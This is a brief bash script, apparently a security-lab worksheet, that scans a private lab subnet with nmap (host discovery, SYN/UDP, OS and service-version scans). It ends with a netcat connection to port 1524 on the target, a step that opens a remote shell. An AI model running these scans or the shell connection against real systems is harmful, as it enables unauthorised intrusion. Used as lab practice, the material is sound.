#!/bin/bash

# host machine's IP
ifconfig | grep inet -m 1


# Activity 1
nmap -sn -n 192.168.56.0/24

# Activity 2
sudo nmap -n -sS 192.168.56.3
sudo nmap -n -sU 192.168.56.3  #this takes like 15 min
# type '?' to see the commands

# Activity 3
nmap -n -O 192.168.56.3 | grep -E "OS|Running"

# Activity 4
nmap -n -sV -p T:21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,5432,5900,6000,6667,8009,8180 192.168.56.3
nmap -n -sU -p U:53,68,69,111,137,138,2049 192.168.56.3

# Activity 5
nc 192.168.56.3 1524